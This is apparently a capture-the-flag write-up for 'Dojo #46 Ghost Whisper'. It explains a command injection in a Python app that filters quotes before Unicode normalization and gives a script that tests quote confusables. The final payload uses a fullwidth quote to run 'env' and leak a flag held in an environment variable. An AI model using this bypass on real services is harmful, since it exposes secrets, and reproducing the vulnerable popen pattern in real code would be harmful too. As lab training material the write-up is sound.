---
title: "Dojo #46 Ghost Whisper"
date: 2025-12-17T17:56:50Z
categories: [ "writeup" ]
draft: false
---

## Description
The application is a mysterious website that lets you whisper to ghosts.

When a message is submitted, the application echoes back the message and displays its hex dump alongside it.

## Source Code Analysis
### Setup Script
In the setup script we can see that the flag is stored in an environment variable.

```bash
os.environ["FLAG"] = flag
```

The HTML template renders both the user’s message (msg) and the hex dump (hextext), which contains the message concatenated with its hexadecimal representation:

```html
<label class="block mb-2 text-sm font-medium text-white"
        >Whisper to me...</label
      >
      <input
        type="text"
        class="bg-gray-900 border border-gray-700 text-gray-400 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5"
        placeholder="B0000oooo..." value="{{ msg }}"
      />

      <div
        class="p-6 rounded-lg bg-black/40 border border-cyan-500/30 shadow-lg shadow-cyan-500/20"
      >
        <p
          class="text-cyan-400 font-mono text-sm md:text-base projection-text"
        >
{{ hextext }}
 </p
        >
      </div>
```

### Application Script

The application replaces single quotes `'` with underscores `_` and normalizes potentially dangerous Unicode characters.

It then uses `os.popen` to execute a shell command that echoes the user input and pipes it to `hexdump`:
```python
import os, unicodedata
from urllib.parse import unquote
from jinja2 import Environment, FileSystemLoader
template = Environment(
    autoescape=True,
    loader=FileSystemLoader('/tmp/templates'),
).get_template('index.html')
os.chdir('/tmp')

def main():
    whisperMsg = unquote("test")

    # Normalize dangerous characters
    whisperMsg = unicodedata.normalize("NFKC", whisperMsg.replace("'", "_"))

    # Run a command and capture its output
    with os.popen(f"echo -n '{whisperMsg}' | hexdump") as stream:
        hextext = f"{stream.read()} | {whisperMsg}"
        print( template.render(msg=whisperMsg, hextext=hextext) )

main()
```

Finally, the application renders the HTML template using `whisperMsg` and `hextext`.

### Exploitation

The flag is stored in an environment variable, and the user input is passed to `popen`, making the application vulnerable to command injection, even if it replaces quotes.

How? Well, since the code replaces single quotes `'` **before** performing Unicode normalization, we can bypass the filter by finding a Unicode character that normalizes to a single quote.

I slightly modified the application to automate the testing of multiple Unicode variants of the quote character that I found [here](https://util.unicode.org/UnicodeJsps/confusables.jsp?a=%27&r=None):

```python
chars = ["｀", "΄", "＇", "ˈ", "ˊ", "ᑊ", "ˋ", "ꞌ", "ᛌ", "𖽒", "𖽑", "‘", "’", "י", "՚", "‛", "՝", "`", "'", "′", "׳", "´", "ʹ", "˴", "ߴ", "‵", "ߵ", "ʻ", "ʼ", "᾽", "ʽ", "῾", "ʾ", "᾿","＇"]
for c in chars:
    payload = c+"|ls"
    payload_encoded = quote(payload)
    print("Payload: ", payload)
    print("Encoded payload: ",payload_encoded)

    main(payload)
```

After running the script, one of these characters successfully normalized to a single quote, which triggered the error showed in the following screenshot.

![](/images/dojo46/TestScript.png)


Then I adjusted the payload to successfully execute a command. The final version that worked was:
```bash
＇| env;＇
```

This injected command executes `env` and reveals the flag from the environment variable:
```bash
# This 
echo -n '{whisperMsg}' | hexdump

# becomes
echo -n '' | env;' ' | hexdump
```

Adding the `;` closes the first pipeline execution and, the following single quote injected is parsed as a non-existent command which makes the second pipeline fail thus avoiding the hexdump output.

![](/images/dojo46/Flag.png)
